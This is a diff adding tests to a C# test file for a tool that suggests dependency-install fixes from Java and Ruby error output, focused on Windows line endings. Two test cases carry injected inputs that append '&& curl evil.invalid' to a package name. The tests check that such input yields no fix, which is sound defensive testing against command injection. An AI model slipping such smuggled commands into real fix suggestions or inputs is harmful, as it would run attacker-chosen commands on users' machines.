@@ -17,11 +17,12 @@ namespace FixFinder.Tests;
 public class MissingDependencyTests
 {
     private static ParsedError Error(
-        string language, string message, string? type = null, ParsedError[]? causes = null) => new()
+        string language, string message, string? type = null, ParsedError[]? causes = null,
+        string? raw = null) => new()
     {
         LanguageId = language,
         Confidence = 90,
-        RawText = type is null ? message : $"{type}: {message}",
+        RawText = raw ?? (type is null ? message : $"{type}: {message}"),
         FirstLineSequence = 0,
         ExceptionType = type,
         Message = message,
@@ -246,6 +247,63 @@ public class MissingDependencyTests
         ]);
 
         Assert.Contains("jackson-databind", Text(error)!, StringComparison.Ordinal);
+    }
+
+    // ------------------------------------------------------------------ line endings
+
+    /// <summary>
+    /// Raw text is joined with the platform's line ending, so on Windows every line but the last
+    /// ends in <c>\r</c> - and a pattern anchored with <c>$</c> has to step over it.
+    /// </summary>
+    /// <remarks>
+    /// Every other test here builds the error as a single line, which is how this went unnoticed:
+    /// a real ClassNotFoundException on Windows produced no fix at all. The message is the bare
+    /// class name, as the Java parser reports it, so the raw text is the only place a match can
+    /// come from. Written out with <c>\r\n</c> rather than relying on the OS, so it fails anywhere.
+    /// </remarks>
+    [Theory]
+    [InlineData("java", "com.google.gson.Gson", "java.lang.ClassNotFoundException",
+        "Exception in thread \"main\" java.lang.ClassNotFoundException: com.google.gson.Gson\r\n\tat App.main(App.java:3)",
+        "<artifactId>gson</artifactId>")]
+    [InlineData("ruby", "", "LoadError",
+        "app.rb:1:in 'require': cannot load such file -- nokogiri (LoadError)\r\n\tfrom app.rb:1:in '<main>'",
+        "gem install nokogiri")]
+    public void AWindowsLineEndingDoesNotHideTheName(
+        string language, string message, string type, string raw, string expected) =>
+        Assert.Contains(expected, Text(Error(language, message, type, raw: raw)) ?? "(nothing)", StringComparison.Ordinal);
+
+    /// <summary>
+    /// Stepping over a <c>\r</c> must not become stepping over anything else.
+    /// </summary>
+    /// <remarks>
+    /// The same truncation the Go, Ruby and Java patterns were fixed for: the name is read to the
+    /// end of the line so that trailing text fails validation rather than being dropped. Allowing a
+    /// carriage return before that end is only safe if the trailing text still reaches it.
+    /// </remarks>
+    [Theory]
+    [InlineData("java", "java.lang.ClassNotFoundException",
+        "java.lang.ClassNotFoundException: org.apache.commons.lang3.StringUtils && curl evil.invalid\r\n\tat App.main(App.java:3)")]
+    [InlineData("ruby", "LoadError",
+        "app.rb:1:in 'require': cannot load such file -- nokogiri && curl evil.invalid (LoadError)\r\n\tfrom app.rb:1:in '<main>'")]
+    public void AWindowsLineEndingDoesNotLetTrailingTextThrough(string language, string type, string raw) =>
+        Assert.Null(Text(Error(language, "", type, raw: raw)));
+
+    /// <summary>
+    /// The crash that found this, captured from a real JDK 21 on Windows and read by the real parser.
+    /// </summary>
+    [Fact]
+    public void ARealClassNotFoundExceptionGetsThePomBlock()
+    {
+        var error = new ParserRegistry().Parse(Fixtures.LoadStackTrace("java/live-classnotfound.txt"));
+
+        Assert.NotNull(error);
+        Assert.Equal("java", error!.LanguageId);
+
+        var fix = MissingDependency.For(error, Spec());
+
+        Assert.NotNull(fix);
+        Assert.Contains("<groupId>com.google.code.gson</groupId>", fix!.Command!, StringComparison.Ordinal);
+        Assert.Contains("<artifactId>gson</artifactId>", fix.Command!, StringComparison.Ordinal);
     }
 
     // ------------------------------------------------------------------ the newer languages
